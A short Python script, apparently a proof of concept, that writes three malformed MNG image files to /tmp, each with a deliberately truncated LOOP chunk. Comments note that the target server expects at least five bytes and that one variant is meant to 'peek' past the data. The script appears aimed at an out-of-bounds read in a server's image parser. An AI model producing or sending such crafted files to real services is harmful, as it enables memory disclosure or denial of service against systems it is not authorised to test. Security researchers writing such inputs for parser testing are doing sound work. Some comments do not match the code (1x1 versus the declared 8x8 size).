import struct, zlib

def chunk(typ, data):
    c = struct.pack('>I', len(data)) + typ + data
    crc = zlib.crc32(typ + data) & 0xffffffff
    return c + struct.pack('>I', crc)

sig = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 8, 8, 8, 2, 0, 0, 0))

# 1x1 RGB black
raw = b'\x00' + b'\x00\x00\x00'
idat = chunk(b'IDAT', zlib.compress(raw))

# LOOP with length 1: server expects >=5 (level + 4-byte iters)
loop = chunk(b'LOOP', b'\x01')
iend = chunk(b'IEND', b'')

mng = sig + ihdr + loop + idat + iend
open('/tmp/poc_loop_len1.mng', 'wb').write(mng)

# LOOP with length 2 (level + 1 byte of iters) to peek
loop2 = chunk(b'LOOP', b'\x01\xff')
mng2 = sig + ihdr + loop2 + idat + iend
open('/tmp/poc_loop_len2.mng', 'wb').write(mng2)

# LOOP with length 3
loop3 = chunk(b'LOOP', b'\x01\xff\xff')
mng3 = sig + ihdr + loop3 + idat + iend
open('/tmp/poc_loop_len3.mng', 'wb').write(mng3)

for f in ['poc_loop_len1', 'poc_loop_len2', 'poc_loop_len3']:
    print(f, len(open('/tmp/'+f+'.mng','rb').read()))
EOF
